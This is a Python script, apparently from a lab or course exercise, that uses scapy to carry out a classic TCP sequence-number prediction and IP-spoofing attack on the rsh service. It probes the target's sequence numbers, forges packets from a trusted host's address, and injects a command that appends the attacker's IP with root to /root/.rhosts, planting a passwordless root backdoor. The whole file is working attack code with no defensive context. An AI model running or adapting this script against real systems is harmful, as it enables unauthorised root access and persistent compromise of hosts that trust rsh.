from scapy.all import *

import sys
import time
if __name__ == "__main__":
    conf.iface = sys.argv[1]
    target_ip = sys.argv[2]
    trusted_host_ip = sys.argv[3]
    attacker_ip = get_if_addr(conf.iface)
    payload = "root\0root\0 echo '"+ attacker_ip+" root' >> /root/.rhosts\0"
    print(payload)
    payload=str.encode(payload)
    print(payload)
    #TODO: figure out SYN sequence number pattern
    ip=IP(src = attacker_ip, dst = target_ip)
    for i in range(1):
        sport = random.randint(1024,65535)
        #sport = 4097
        SYN=TCP(sport=sport, dport=514, flags='S',seq=100)
        #print("--------------startSYN--------------")
        SYNACK=sr1(ip/SYN,verbose=0)
        #print("-------------getSYNACK--------------")
        #seq_num.append(SYNACK.seq)
        #print("-------------sendACK----------------")
        #ACK=TCP(sport=sport, dport=514, flags='A',seq=SYNACK.ack, ack=SYNACK.seq)
        #send(ip/ACK,verbose=0)
        #print("-------------sendRST----------------")
        send(ip/TCP(sport=sport, dport=514, flags='R'),verbose=0)
    #TODO: TCP hijacking with predicted sequence number
    ip=IP(src = trusted_host_ip, dst = target_ip)
    sport = 1023
    seq=1000
    SYN=TCP(sport = sport, dport=514, flags='S',seq=seq)
    seq += 1
    ack=SYNACK.seq+64001
    send(ip/SYN,verbose=0)
    #time.sleep(3)
    ACK=TCP(sport = sport, dport=514, flags='A',seq=seq, ack=ack)
    stderr_PUSH=TCP(sport = sport, dport=514, flags='AP',seq=seq, ack=ack)
    command_PUSH=TCP(sport = sport, dport=514, flags='AP',seq=seq+5, ack=ack)
    send(ip/ACK,verbose=0)
    send(ip/stderr_PUSH/Raw(load=str.encode('1022\0')),verbose=0)
    time.sleep(5)
    for i in range(1019,1024):
        SYNACK=TCP(sport=1022, dport=i, flags='SA',seq=seq, ack=ack+64000)
        send(ip/SYNACK,verbose = 0)
    time.sleep(2)
    send(ip/command_PUSH/Raw(load=payload),verbose=0)
    time.sleep(2)
    for i in range(1019,1024):
        send(ip/TCP(sport=1022, dport=i, flags='R'),verbose=0)
    send(ip/TCP(sport=sport, dport=514, flags='R'),verbose=0)
